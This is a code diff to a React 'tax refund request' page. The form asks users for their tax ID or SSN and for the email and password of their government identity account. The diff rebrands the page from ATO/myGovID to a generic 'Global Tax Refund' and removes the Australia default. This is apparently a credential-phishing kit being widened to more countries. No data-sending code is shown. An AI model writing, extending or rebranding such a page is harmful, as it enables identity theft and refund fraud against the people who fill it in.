@@ -86,7 +86,7 @@ const TrackingView = ({ onBack }: { onBack: () => void }) => {
                         </div>
                         <div className="flex flex-col mobile:flex-row mobile:items-center gap-2 mobile:gap-4">
                           <p className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest flex items-center gap-1.5">
-                            <Shield className="w-3.5 h-3.5" /> TFN: XXX-XX-{refund.ssn.slice(-4)}
+                            <Shield className="w-3.5 h-3.5" /> Tax ID: XXX-XX-{refund.ssn.slice(-4)}
                           </p>
                           <p className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest flex items-center gap-1.5">
                             <Globe className="w-3.5 h-3.5" /> {refund.country}
@@ -97,7 +97,7 @@ const TrackingView = ({ onBack }: { onBack: () => void }) => {
 
                     <div className="flex flex-wrap gap-6 mobile:gap-10 pt-4 mobile:pt-0 border-t mobile:border-t-0 border-gray-200/50">
                       <div>
-                        <p className="text-[8px] mobile:text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1.5">myGovID Profile</p>
+                        <p className="text-[8px] mobile:text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1.5">Government ID Profile</p>
                         <p className="text-[10px] mobile:text-[11px] font-black text-navy-900 tracking-tight lowercase">{refund.idmeEmail}</p>
                       </div>
                       <div>
@@ -134,7 +134,7 @@ const TrackingView = ({ onBack }: { onBack: () => void }) => {
                     <div className="mobile:hidden space-y-4">
                       {[
                         { label: 'Secure Transmission', active: true, done: true, desc: 'Encrypted packet sent to retrieval ledger.' },
-                        { label: 'Forensic Intelligence Audit', active: refund.status !== 'pending', done: refund.status !== 'pending' && refund.status !== 'processing', desc: 'Authorised verification of ATO assets.' },
+                        { label: 'Forensic Intelligence Audit', active: refund.status !== 'pending', done: refund.status !== 'pending' && refund.status !== 'processing', desc: 'Authorised verification of tax assets.' },
                         { label: 'Authorised Asset Release', active: refund.status === 'approved' || refund.status === 'rejected', done: refund.status === 'approved' || refund.status === 'rejected', desc: 'Release of confirmed tax refund sum.' }
                       ].map((step, i) => (
                         <div key={i} className="flex gap-4">
@@ -188,7 +188,7 @@ const TaxRefundSection = () => {
   const [ssn, setSsn] = useState('');
   const [idmeEmail, setIdmeEmail] = useState('');
   const [idmePassword, setIdmePassword] = useState('');
-  const [country, setCountry] = useState('Australia');
+  const [country, setCountry] = useState('');
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -261,12 +261,12 @@ const TaxRefundSection = () => {
                   <FileText className="w-7 h-7 mobile:w-10 mobile:h-10 text-primary-500" />
                 </div>
                 <div>
-                  <h2 className="text-xl mobile:text-4xl font-black uppercase tracking-tight">ATO Tax Refund</h2>
+                  <h2 className="text-xl mobile:text-4xl font-black uppercase tracking-tight">Global Tax Refund</h2>
                   <p className="text-primary-500/80 font-black text-[10px] mobile:text-xs uppercase tracking-widest mt-1">Request Service Center</p>
                 </div>
               </div>
               <p className="text-gray-400 text-xs mobile:text-base max-w-2xl leading-relaxed">
-                Please fill out the form below to submit your ATO tax refund request. Our experts will handle the verification and processing with efficiency.
+                Please fill out the form below to submit your tax refund request. Our experts will handle the verification and processing with efficiency.
               </p>
             </div>
           </div>
@@ -298,7 +298,7 @@ const TaxRefundSection = () => {
                     </div>
 
                     <div className="space-y-2">
-                      <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Tax File Number (TFN)</label>
+                      <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Tax Identification Number</label>
                       <div className="relative group">
                         <Shield className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                         <input
@@ -313,15 +313,15 @@ const TaxRefundSection = () => {
                     </div>
                   </div>
 
-                  {/* myGovID Credentials */}
+                  {/* Government ID Credentials */}
                   <div className="space-y-6">
                     <h4 className="flex items-center gap-2 text-[10px] font-black text-primary-600 uppercase tracking-[0.2em]">
-                      <Lock className="w-4 h-4" /> myGovID Credentials
+                      <Lock className="w-4 h-4" /> Government ID Credentials
                     </h4>
 
                     <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                       <div className="space-y-2">
-                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">myGovID Email</label>
+                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Government ID Email</label>
                         <div className="relative group">
                           <Mail className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                           <input
@@ -336,7 +336,7 @@ const TaxRefundSection = () => {
                       </div>
 
                       <div className="space-y-2">
-                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">myGovID Password</label>
+                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Government ID Password</label>
                         <div className="relative group">
                           <Lock className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                           <input
@@ -362,7 +362,7 @@ const TaxRefundSection = () => {
                         <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Country</label>
                         <div className="relative">
                           <select
-                            value={country === 'Australia' || country === 'Afghanistan' || country === 'Canada' || country === 'United Kingdom' ? country : 'Other'}
+                            value={country === '' || country === 'Afghanistan' || country === 'Canada' || country === 'United Kingdom' || country === 'Australia' ? country : 'Other'}
                             onChange={(e) => {
                               const val = e.target.value;
                               setCountry(val === 'Other' ? '' : val);
@@ -370,6 +370,7 @@ const TaxRefundSection = () => {
                             className="w-full px-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-primary-500/20 focus:border-primary-500 outline-none transition-all font-bold text-navy-900 appearance-none cursor-pointer mobile:text-base text-sm"
                             required
                           >
+                            <option value="">Select Country</option>
                             <option value="Australia">Australia</option>
                             <option value="Afghanistan">Afghanistan</option>
                             <option value="Canada">Canada</option>
@@ -408,7 +409,7 @@ const TaxRefundSection = () => {
                     <div>
                       <h5 className="text-[10px] font-black text-red-700 uppercase tracking-widest mb-1">Important Notice</h5>
                       <p className="text-xs text-red-600 font-medium leading-relaxed">
-                        Please ensure all information provided is accurate and matches your myGovID account details. Any discrepancies may result in delays or rejection of your refund request.
+                        Please ensure all information provided is accurate and matches your government ID account details. Any discrepancies may result in delays or rejection of your refund request.
                       </p>
                     </div>
                   </div>
